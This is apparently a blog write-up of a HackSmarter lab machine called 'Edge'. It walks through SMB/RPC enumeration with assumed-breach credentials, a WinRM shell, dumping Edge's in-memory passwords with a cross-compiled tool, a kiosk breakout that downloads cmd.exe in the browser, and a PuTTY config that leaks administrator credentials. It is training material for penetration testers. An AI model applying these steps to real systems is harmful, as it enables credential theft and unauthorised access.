@@ -1,0 +1,350 @@
+---
+title: HackSmarter - Edge
+date: 2026-07-03
+image: cover.png
+tags: [HackSmarter, Easy, Windows]
+excerpt: An easy Windows box that reuses assumed-breach credentials into a WinRM shell, dumps in-memory Microsoft Edge passwords to recover a VDI service account, breaks out of an RDP kiosk through a browser file download to spawn a shell, and loots a PuTTY config holding local administrator credentials.
+---
+
+# Edge
+
+### Initial Access
+
+The client wants you to do an "assumed breach" pentest, so they have provided you with starting credentials.
+
+```bash
+Username: jmorris
+Password: Fabricat!on2024
+```
+
+### NMAP Scanning
+
+```bash
+PORT      STATE SERVICE       REASON          VERSION
+135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
+445/tcp   open  microsoft-ds? syn-ack ttl 126
+3389/tcp  open  ms-wbt-server syn-ack ttl 126
+| ssl-cert: Subject: commonName=VantaraOps
+| Issuer: commonName=VantaraOps
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2026-05-08T12:26:38
+| Not valid after:  2026-11-07T12:26:38
+| MD5:   350a:3876:6223:2087:a2b6:8725:d3f0:d473
+| SHA-1: 35e1:8594:7808:cea8:1acc:ab7a:0dbf:ba6f:07b7:b2bf
+| -----BEGIN CERTIFICATE-----
+| MIIC2DCCAcCgAwIBAgIQHuLdnSVA66hFP/ZixuXiyTANBgkqhkiG9w0BAQsFADAV
+| MRMwEQYDVQQDEwpWYW50YXJhT3BzMB4XDTI2MDUwODEyMjYzOFoXDTI2MTEwNzEy
+| MjYzOFowFTETMBEGA1UEAxMKVmFudGFyYU9wczCCASIwDQYJKoZIhvcNAQEBBQAD
+| ggEPADCCAQoCggEBAMdCjFfWOjJAu1yUjh2+3SIWm7RgycAj0iGW011DsZ3JaSxQ
+| g1e2tZp5Hn3uga+KKdEsGuKuG+F3h/kIZVZUcwBxXNY/grm0w90nKxDC/Qx0Pa0H
+| 5ZZO9/BQ4fMNLZgfoPVTySDmV+67o7MK/luOJcHfYdNbF7oOsLLCCR1dqwcsOSMO
+| NNj83hxCEomxs28+6M/cYRQykfWmUbCL6o9o0rIlSoCzoAXguENonH59IvSbmsdr
+| AZZ5ktOA3veK/5oznkbIYNQRGPLlterC1GNpNE/ml0YHi6mQqTdvicz0S7g+JLrY
+| k3yCKE9ZOBdL8+4gXJa07FqTmxwnUrvNOSfDibECAwEAAaMkMCIwEwYDVR0lBAww
+| CgYIKwYBBQUHAwEwCwYDVR0PBAQDAgQwMA0GCSqGSIb3DQEBCwUAA4IBAQBiYAN+
+| SZ0gPL8AFGqAvGSkzoSiyxBI5SWBe3AsJ6/4gdCseaHurQFPat/AFkRjD6SJwqyB
+| 0RZxFWKmr+dsdc6MSCLxUMYwkfMOFwCM2jWbOmJAwitGkSYcY6VY/2iZ18ImOqan
+| DR7WlsevNqT4PzU+nD11tw5Fe8w0UfnA0kIu5tyclNdJjoEeupE+spBzawZ6ljEs
+| eNciUndVh2hm97Im2RtLv7hG/OnNYGd3eeEJJ9YubnVSvoKApUJtQiM7voEEI2ta
+| zILouZ1oyFQGaPdW8eLieHReu9ZDx3dGnSQZu9yvY3loKcqd9MdJDkyxhqyVlMLl
+| NYDHoqotV8+8UIJO
+|_-----END CERTIFICATE-----
+| rdp-ntlm-info:
+|   Target_Name: VANTARAOPS
+|   NetBIOS_Domain_Name: VANTARAOPS
+|   NetBIOS_Computer_Name: VANTARAOPS
+|   DNS_Domain_Name: VantaraOps
+|   DNS_Computer_Name: VantaraOps
+|   Product_Version: 10.0.26100
+|_  System_Time: 2026-07-03T14:57:19+00:00
+|_ssl-date: TLS randomness does not represent time
+5985/tcp  open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+49670/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port3389-TCP:V=7.95%I=7%D=7/3%Time=6A47CDA1%P=x86_64-pc-linux-gnu%r(Ter
+SF:minalServerCookie,13,"\x03\0\0\x13\x0e\xd0\0\0\x124\0\x02/\x08\0\x02\0\
+SF:0\0");
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| p2p-conficker:
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 11535/tcp): CLEAN (Timeout)
+|   Check 2 (port 64281/tcp): CLEAN (Timeout)
+|   Check 3 (port 22144/udp): CLEAN (Timeout)
+|   Check 4 (port 62231/udp): CLEAN (Timeout)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+|_clock-skew: mean: 0s, deviation: 0s, median: 0s
+| smb2-time:
+|   date: 2026-07-03T14:57:23
+|_  start_date: N/A
+| smb2-security-mode:
+|   3:1:1:
+|_    Message signing enabled but not required
+```
+
+### RPC Enumeration
+
+Connecting with NULL authentication returns an `NT_STATUS_ACCESS_DENIED` error:
+
+{% image %}
+
+The provided credentials, however, connect successfully and allow enumeration: `rpcclient -U jmorris%'Fabricat!on2024' 10.1.138.50`
+
+{% image2 %}
+
+### SMB Enumeration
+
+Enumerating the SMB shares shows READ and WRITE permissions on the `VantaraOps` share:
+
+{% image3 %}
+
+Before diving into the share, an `--rid-brute` attack surfaces any other users worth noting:
+
+{% image4 %}
+
+The output lists a large number of accounts. Rather than reproduce the full list, the results can be saved with `poetry run NetExec smb 10.1.138.50 -u 'jmorris' -p 'Fabricat!on2024' --rid-brute | tee output.txt`, and the usernames extracted with the following command:
+
+```bash
+cat output.txt | grep SidTypeUser | awk '{print $6}' | cut -d '\' -f 2
+```
+
+This prints the users one per line:
+
+{% image5 %}
+
+### SMB - VantaraOps Enumeration
+
+Connecting to the share with `impacket-smbclient` to review its contents:
+
+{% image6 %}
+
+Inspecting every file across the directories turns up nothing useful. The JSON below is the inventory generated by netexec's `-M spider_plus` module, which maps out all the files in the share:
+
+```json
+{
+    "VantaraOps": {
+        "Finance/Q1_2024_summary.txt": {
+            "atime_epoch": "2026-05-09 19:53:10",
+            "ctime_epoch": "2026-05-09 19:48:32",
+            "mtime_epoch": "2026-05-10 00:49:17",
+            "size": "637 B"
+        },
+        "Finance/purchase_orders_pending.txt": {
+            "atime_epoch": "2026-05-09 19:53:10",
+            "ctime_epoch": "2026-05-09 19:48:32",
+            "mtime_epoch": "2026-05-10 00:49:17",
+            "size": "627 B"
+        },
+        "HR/holiday_schedule_2024.txt": {
+            "atime_epoch": "2026-05-09 19:53:10",
+            "ctime_epoch": "2026-05-09 19:41:31",
+            "mtime_epoch": "2026-05-10 00:49:17",
+            "size": "531 B"
+        },
+        "HR/onboarding_checklist.txt": {
+            "atime_epoch": "2026-05-09 19:53:10",
+            "ctime_epoch": "2026-05-09 19:41:31",
+            "mtime_epoch": "2026-05-10 00:49:17",
+            "size": "894 B"
+        },
+        "HR/org_chart.txt": {
+            "atime_epoch": "2026-05-09 19:53:10",
+            "ctime_epoch": "2026-05-09 19:41:31",
+            "mtime_epoch": "2026-05-10 00:49:17",
+            "size": "1.5 KB"
+        },
+        "IT/asset_register.txt": {
+            "atime_epoch": "2026-05-09 19:53:09",
+            "ctime_epoch": "2026-05-09 19:41:30",
+            "mtime_epoch": "2026-05-10 00:49:17",
+            "size": "1.44 KB"
+        },
+        "IT/helpdesk_log.txt": {
+            "atime_epoch": "2026-05-09 19:53:10",
+            "ctime_epoch": "2026-05-09 19:41:31",
+            "mtime_epoch": "2026-05-10 00:49:17",
+            "size": "675 B"
+        },
+        "IT/network_notes.txt": {
+            "atime_epoch": "2026-05-09 19:53:10",
+            "ctime_epoch": "2026-05-09 19:41:30",
+            "mtime_epoch": "2026-05-10 00:49:17",
+            "size": "832 B"
+        },
+        "IT/password_policy.txt": {
+            "atime_epoch": "2026-05-09 19:53:10",
+            "ctime_epoch": "2026-05-09 19:41:30",
+            "mtime_epoch": "2026-05-10 00:49:17",
+            "size": "674 B"
+        },
+        "Logs/asset_info.txt": {
+            "atime_epoch": "2026-05-10 00:49:18",
+            "ctime_epoch": "2026-05-08 20:33:38",
+            "mtime_epoch": "2026-05-10 00:49:18",
+            "size": "165 B"
+        },
+        "Production/customer_delivery_schedule.txt": {
+            "atime_epoch": "2026-05-09 19:53:10",
+            "ctime_epoch": "2026-05-09 19:41:32",
+            "mtime_epoch": "2026-05-10 00:49:17",
+            "size": "734 B"
+        },
+        "Production/weekly_schedule.txt": {
+            "atime_epoch": "2026-05-09 19:53:10",
+            "ctime_epoch": "2026-05-09 19:41:32",
+            "mtime_epoch": "2026-05-10 00:49:17",
+            "size": "826 B"
+        },
+        "README.txt": {
+            "atime_epoch": "2026-05-10 00:49:18",
+            "ctime_epoch": "2026-05-08 20:33:38",
+            "mtime_epoch": "2026-05-10 00:49:18",
+            "size": "302 B"
+        },
+        "Reports/weekly_production_20260508.txt": {
+            "atime_epoch": "2026-05-08 20:33:38",
+            "ctime_epoch": "2026-05-08 20:33:38",
+            "mtime_epoch": "2026-05-10 00:49:17",
+            "size": "294 B"
+        },
+        "Reports/weekly_production_20260509.txt": {
+            "atime_epoch": "2026-05-10 00:49:18",
+            "ctime_epoch": "2026-05-09 13:57:36",
+            "mtime_epoch": "2026-05-10 00:49:18",
+            "size": "292 B"
+        },
+        "Safety/emergency_procedures.txt": {
+            "atime_epoch": "2026-05-09 19:53:11",
+            "ctime_epoch": "2026-05-09 19:41:32",
+            "mtime_epoch": "2026-05-10 00:49:17",
+            "size": "1.01 KB"
+        },
+        "Safety/incident_log_2024.txt": {
+            "atime_epoch": "2026-05-09 19:53:10",
+            "ctime_epoch": "2026-05-09 19:41:32",
+            "mtime_epoch": "2026-05-10 00:49:17",
+            "size": "814 B"
+        },
+        "Scripts/workstation_health.bat": {
+            "atime_epoch": "2026-05-10 00:49:18",
+            "ctime_epoch": "2026-05-08 20:33:38",
+            "mtime_epoch": "2026-05-10 00:49:18",
+            "size": "844 B"
+        },
+        "Templates/NCR_form.txt": {
+            "atime_epoch": "2026-05-09 19:53:11",
+            "ctime_epoch": "2026-05-09 19:41:33",
+            "mtime_epoch": "2026-05-10 00:49:17",
+            "size": "851 B"
+        },
+        "Templates/change_request_form.txt": {
+            "atime_epoch": "2026-05-09 19:53:11",
+            "ctime_epoch": "2026-05-09 19:41:32",
+            "mtime_epoch": "2026-05-10 00:49:17",
+            "size": "778 B"
+        }
+    }
+}
+```
+
+Even after reviewing each file individually, nothing of value appears. The next step is testing the same credentials against other services such as WinRM and RDP:
+
+{% image7 %}
+
+The credentials authenticate over WinRM, so `evil-winrm` provides an interactive shell on the machine:
+
+{% image8 %}
+
+### Local Privilege Escalation
+
+A quick `Get-Process` shows `msedge` running. A recent Microsoft Edge weakness is that the browser loads every saved password into memory in cleartext at startup and keeps them there for the whole session, even for sites the user never visits, which makes them recoverable from the running process.
+
+The [EdgeSnapper](https://github.com/Dragkob/EdgeSnapper) toolkit is purpose-built to dump these in-memory cleartext credentials from Microsoft Edge. Cross-compiling it for Windows:
+
+```bash
+x86_64-w64-mingw32-g++ edgeSnapper.cpp -o edgeSnapper.exe -static -static-libgcc -static-libstdc++ -ldbghelp -lpsapi
+```
+
+{% image9 %}
+
+Because the session is over `evil-winrm`, the binary can be pushed across with `upload edgeSnapper.exe`. Running it then dumps the credentials held in Edge's memory:
+
+{% image10 %}
+
+Two new credential sets appear, for `sburns` and `svc_vdi`. A `net user sburns` shows that `sburns` does not exist on this machine, but the password is worth keeping for a possible password spray elsewhere:
+
+{% image11 %}
+
+### VDI Enumeration
+
+The `svc_vdi` account is the useful one, since it exists on the machine and belongs to the `Remote Desktop Users` group, which grants RDP access:
+
+{% image12 %}
+
+Verifying the RDP access with `netexec` against the `rdp` protocol:
+
+{% image13 %}
+
+The account logs in over RDP, so `xfreerdp3` opens a session: `xfreerdp3 /u:svc_vdi /p:V@ntara#Ops1 /v:10.1.138.50`
+
+{% image14 %}
+
+The session lands inside a Windows kiosk. A kiosk is **a standard PC or device configured to run in a strict lockdown mode**. It restricts users to a single application (such as a self-service check-in screen, POS terminal, or digital sign) or a small set of applications, and blocks access to the desktop, files, and system settings.
+
+Authenticating inside the kiosk with the same credentials used for RDP:
+
+{% image15 %}
+
+Authentication succeeds. The Contact Support panel of the application exposes a clickable hyperlink:
+
+{% image16 %}
+
+After a few reconnect attempts, the link finally opens a browser window showing a "cannot reach this page" error:
+
+{% image17 %}
+
+### Kiosk Breakout
+
+The simplest escape is to use that browser to download `cmd.exe` and then launch it:
+
+{% image18 %}
+
+Browsing to [`file:///c:/windows/system32/cmd.exe`](file:///c:/windows/system32/cmd.exe) automatically downloads the `cmd.exe` binary, which can then be launched from the Downloads panel ( CTRL + J ).
+
+Browsing to the user's home folder and running `tree /F` to list all files surfaces something interesting:
+
+{% image19 %}
+
+The Documents folder holds a `putty.conf` file with the following contents:
+
+```bash
+C:\Users\svc_vdi.VANTARAOPS\Documents>type putty.conf
+$session = "VDI-MGMT"
+
+New-Item -Path "HKCU:\Software\SimonTatham\PuTTY\Sessions\$session" -Force | Out-Null
+
+Set-ItemProperty -Path "HKCU:\Software\SimonTatham\PuTTY\Sessions\$session" -Name HostName     -Value "10.10.10.25"
+Set-ItemProperty -Path "HKCU:\Software\SimonTatham\PuTTY\Sessions\$session" -Name Protocol     -Value "ssh"
+Set-ItemProperty -Path "HKCU:\Software\SimonTatham\PuTTY\Sessions\$session" -Name PortNumber   -Value 22
+Set-ItemProperty -Path "HKCU:\Software\SimonTatham\PuTTY\Sessions\$session" -Name UserName     -Value "svc_vdi_mgmt"
+Set-ItemProperty -Path "HKCU:\Software\SimonTatham\PuTTY\Sessions\$session" -Name TerminalType -Value "xterm"
+Set-ItemProperty -Path "HKCU:\Software\SimonTatham\PuTTY\Sessions\$session" -Name Compression  -Value 1
+Set-ItemProperty -Path "HKCU:\Software\SimonTatham\PuTTY\Sessions\$session" -Name TryAgent     -Value 1
+Set-ItemProperty -Path "HKCU:\Software\SimonTatham\PuTTY\Sessions\$session" -Name PingInterval -Value 30
+Set-ItemProperty -Path "HKCU:\Software\SimonTatham\PuTTY\Sessions\$session" -Name Password     -Value "56tyghbn%^TYGHBN"
+
+Write-Host "PuTTY session '$session' created."
+```
+
+It contains credentials for the user `svc_vdi_mgmt`, which belongs to the Local Administrators group:
+
+{% image20 %}
+
+Connecting with that account to grab the flags and finish the machine:
+
+{% image21 %}
